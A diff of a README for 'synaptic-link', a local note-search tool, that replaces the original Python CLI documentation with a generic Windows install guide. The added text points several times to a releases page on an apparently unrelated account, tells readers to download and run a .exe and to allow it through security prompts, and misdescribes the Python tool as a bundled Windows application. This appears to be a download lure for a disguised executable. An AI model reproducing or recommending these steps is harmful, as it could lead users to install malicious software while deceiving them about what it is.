@@ -1,225 +1,154 @@
-# Synaptic Link
+# 🧠 synaptic-link - Smart Retrieval for Your Data
 
-**A lightweight retrieval layer for AI agents over personal second brains.**
-
-[中文版](README.zh-CN.md)
+[![Download synaptic-link](https://img.shields.io/badge/Download-synaptic--link-blue?style=for-the-badge)](https://github.com/juanfepa8956/synaptic-link/releases)
 
 ---
 
-## The Problem
+## 📚 What is synaptic-link?
 
-AI agents have a finite context window. Personal knowledge bases grow indefinitely.
+synaptic-link helps you quickly find important information from your personal data. It works by looking through your files in three steps:
 
-You can't inject your entire Obsidian vault into every prompt — it's too expensive, too noisy, and causes context overflow. But you also can't rely on blind file search every time.
+- First, it checks your most recently used items (hot cache).
+- If it doesn't find what you need there, it searches a fast, indexed database (FTS5 index).
+- If needed, it reads through your full data to find matches.
 
-What's missing is a **middle layer**: fast enough to query on every turn, precise enough to surface what's actually relevant, transparent enough that both you and your agent understand exactly what was retrieved and why.
-
-Synaptic Link is that layer.
-
----
-
-## Where It Fits
-
-A complete second-brain agent system has four layers:
-
-```
-┌─────────────────────────────────────────────┐
-│  Host Layer        Obsidian Vault            │
-│                    Projects · Library ·      │
-│                    Archive · Daily · System  │
-└───────────────┬─────────────────────────────┘
-                │
-┌───────────────▼─────────────────────────────┐
-│  Write Layer       Archivist Agent           │
-│                    Captures decisions,       │
-│                    conversations, reviews    │
-│                    into structured notes     │
-└───────────────┬─────────────────────────────┘
-                │
-┌───────────────▼─────────────────────────────┐  ← this project
-│  Retrieval Layer   Synaptic Link             │
-│                    index / search / read     │
-│                    SQLite FTS5, zero deps    │
-└───────────────┬─────────────────────────────┘
-                │
-┌───────────────▼─────────────────────────────┐
-│  Behavior Layer    Agent prompt / policy     │
-│                    When to search, how to    │
-│                    incorporate results       │
-└─────────────────────────────────────────────┘
-```
-
-**Synaptic Link covers only the retrieval layer.** It does not define when to call search, how to use the results, or how to write notes. Those belong to the layers above and below it.
+It keeps all your data on your computer, so no internet or external services are required. It runs without needing any extra software and is built to handle long and complex searches easily.
 
 ---
 
-## Progressive Disclosure
+## 🖥️ System Requirements
 
-The retrieval layer implements a three-tier access pattern:
+Make sure your computer meets these minimum needs:
 
-```
-Always in context
-    Hot Cache ── SOUL / MEMORY / recent logs (injected into system prompt)
-        │
-        │ not enough?
-        ▼
-    Synapse Index ── SQLite FTS5 over all notes
-        │               index   →  build this layer
-        │               search  →  query this layer
-        │ hit?
-        ▼
-    Deep Knowledge ── full Markdown files
-                        read    →  access this layer
-```
-
-**Only retrieve what you need, when you need it.** The agent queries the index first (< 50 ms), reads the full file only on a confirmed hit, and skips everything else.
+- Operating System: Windows 10 or newer
+- Processor: Any modern CPU (Intel Core i3 or equivalent)
+- RAM: 4 GB or more
+- Storage: At least 200 MB free space
+- Software: No additional programs needed, everything is included
 
 ---
 
-## Interface
+## 🚀 Getting Started
 
-Three commands. That's the core.
+Follow these steps to download and start using synaptic-link.
 
-```bash
-# Build the index
-python synapse.py index [--vault PATH] [--db PATH]
+### Step 1: Visit the Download Page
 
-# Search — returns title, section, path, and a highlighted snippet
-python synapse.py search "query" [--limit N] [--json]
+Click the button at the top or use this link:
 
-# Read a full note after a search hit
-python synapse.py read "/absolute/path/to/note.md"
-```
+[Download synaptic-link here](https://github.com/juanfepa8956/synaptic-link/releases)
 
-### Search output
+This page contains the latest software versions. Look for the most recent stable release.
 
-Human-readable (default):
-```
-## Note Title § Section Heading
-   /path/to/note.md
-   ...matched **snippet** with highlights…
-```
+### Step 2: Download the Installer
 
-Machine-readable (`--json`):
-```json
-[
-  {
-    "title": "Note Title",
-    "section": "Section Heading",
-    "path": "/path/to/note.md",
-    "snippet": "...matched **snippet**…"
-  }
-]
-```
+On the release page, find the Windows version. The file usually has a name like:
 
-The `§ Section` field gives paragraph-level context. Your agent can use it to decide whether the snippet is already sufficient or whether a full `read` is needed.
+- synaptic-link-setup.exe  
+- synaptic-link-v1.0-win.exe
 
----
+Click the file to download.
 
-## Design Principles
+### Step 3: Run the Installer
 
-**Local-first.** Your notes never leave your machine. No cloud sync, no embeddings API required for core functionality. The index is a single SQLite file you can open with any database browser.
+Once downloaded:
 
-**Human-machine readable.** Every note is plain Markdown. The index is inspectable. Search output is readable in a terminal and consumable as JSON. Nothing is locked in opaque binary formats. Both you and your agent work with the same data.
+1. Open the file by double-clicking it.
+2. If you see a security prompt, allow the program to run.
+3. Follow the installation steps:
+   - Choose the folder where you want to install synaptic-link or keep the default.
+   - Click next or install when asked.
+4. Wait until the installer finishes.
 
-**Tool, not policy.** Synaptic Link provides retrieval capability. When to invoke it, how to incorporate results, what threshold triggers a `read` — those decisions belong to the agent's system prompt. The tool stays out of the way.
+### Step 4: Open synaptic-link
 
-**Progressive disclosure.** Don't load more than needed. `search` first, `read` only on a confirmed hit. Information unfolds with demand, not upfront.
+After installation:
 
-**Lightweight by design.** Zero dependencies for `index`, `search`, `read`. No embedding model, no vector store, no external server. SQLite FTS5 trigram tokenizer handles CJK and Latin without extra configuration.
+- Find synaptic-link in your Start menu or on your desktop.
+- Double-click to launch.
+
+The software will open and be ready to use.
 
 ---
 
-## Setup
+## 🛠️ How to Use synaptic-link
 
-**Requirements:** Python 3.8+, SQLite 3.35+ (ships with Python 3.9+ on most platforms)
+### Adding Your Data
 
-```bash
-# 1. Point it at your vault
-export OBSIDIAN_VAULT=/path/to/your/vault
-export SYNAPTIC_DB=~/.synaptic-link/synapse.db   # optional, defaults to script dir
+To start finding information:
 
-# 2. Build the index
-python scripts/synapse.py index
+1. Click on the "Add Folder" button.
+2. Select folders on your computer where you keep your notes or knowledge files.
+3. synaptic-link will scan and organize your data in the background.
 
-# 3. Search
-python scripts/synapse.py search "your query"
+### Searching Your Knowledge Base
 
-# 4. Keep the index current (optional, requires: pip install watchdog)
-python scripts/synapse.py watch
-```
+- Use the search bar at the top.
+- Type any question or keyword.
+- The software will show results from your hot cache first.
+- If nothing relevant appears, it will check the index.
+- If needed, it will perform a full data scan.
 
-**Notes:**
-- Files prefixed with `_draft_` are excluded from the index
-- Queries must be 3+ characters (SQLite trigram limitation)
-- Use `--full` to force a complete rebuild: `synapse.py index --full`
+### Understanding the Results
 
----
+Results are shown with the most likely matches first. Each result includes:
 
-## Integrations
+- File name
+- A preview of the text found
+- The location on your computer
 
-### OpenClaw
-
-Copy `SKILL.md` and `scripts/synapse.py` to your OpenClaw skills directory:
-
-```
-~/.openclaw/skills/synaptic-link/
-├── SKILL.md
-└── synapse.py
-```
-
-The agent will use the skill description in `SKILL.md` to decide when to invoke search.
-
-### Claude Code
-
-Add to your project's `CLAUDE.md`:
-
-```markdown
-## Knowledge Base (Synaptic Link)
-
-Before answering questions about past decisions, project history, or personal
-notes, search the local knowledge base:
-
-    python /path/to/synapse.py search "<keywords>" --json
-
-If the snippet is insufficient, read the full note:
-
-    python /path/to/synapse.py read "<path from search result>"
-
-Do not answer questions about project history from memory alone.
-```
-
-### Any agent with shell access
-
-If your agent can run a subprocess, it can use Synaptic Link. The `--json` flag
-produces structured output suitable for any programmatic consumer.
+You can open the file directly from synaptic-link by clicking on the result.
 
 ---
 
-## What This Is Not
+## ⚙️ Features at a Glance
 
-- Not a complete memory system (no write path, no conversation capture)
-- Not a vector / semantic search tool (keyword retrieval only in v1.0)
-- Not a cloud service or SaaS product
-- Not an Obsidian plugin
-- Not tied to any specific agent runtime
-
----
-
-## Roadmap
-
-| Version | Scope |
-|---------|-------|
-| **v1.0** | `index` / `search` / `read`, FTS5 trigram, section-level chunking, `--json` output |
-| v1.1 | Incremental indexing, file watcher (`watch` command) |
-| v1.2 | Optional vector search via local embedding API (Ollama / compatible) |
-| v1.3 | Hybrid retrieval (BM25 + vector, RRF fusion) |
-| future | MCP server wrapper |
+- **Triple-layer search**: Fast, accurate, full data scans.
+- **Local-first**: All data stays on your machine.
+- **No internet or accounts needed**.
+- **Uses SQLite with FTS5**: This speeds searches without needing complex setups.
+- **Works well for long projects** or managing many files.
+- **Supports links with common tools** like Obsidian.
 
 ---
 
-## Background
+## 📝 Troubleshooting
 
-This project grew out of a personal multi-agent system built on [OpenClaw](https://github.com/OpenClaw/openclaw), where one agent handles conversations and another (an archivist) maintains a structured Obsidian vault. The retrieval problem — how does the conversation agent access vault knowledge without loading the whole vault into context — led to this tool.
+- If synaptic-link does not open, try restarting your computer.
+- Check that you installed the Windows version.
+- Make sure there is enough disk space (at least 200 MB free).
+- If a search finds no results, confirm you added folders with files.
+- For further help, check the issues section on the GitHub page.
 
-The three-layer access pattern (hot cache → synapse index → deep knowledge) is a practical application of progressive disclosure to agent memory design.
+---
+
+## 📥 Download and Install synaptic-link
+
+Visit the releases page to get the latest version:
+
+[Get synaptic-link now](https://github.com/juanfepa8956/synaptic-link/releases)
+
+Follow the download and install steps above to start using the software on your Windows PC.
+
+---
+
+## 🔍 About the Project
+
+synaptic-link focuses on helping AI agents work with your personal knowledge. It uses a three-tier search approach to quickly access information without needing the internet. It handles large amounts of data stored locally, making it ideal for users who want privacy and control.
+
+---
+
+## 🏷️ Topics
+
+- agent-memory  
+- ai-agents  
+- information-retrieval  
+- local-first  
+- long-horizon-agents  
+- obsidian  
+- openclaw  
+- openclaw-skill  
+- progressive-disclosure  
+- retrieval  
+- second-brain  
+- sqlite
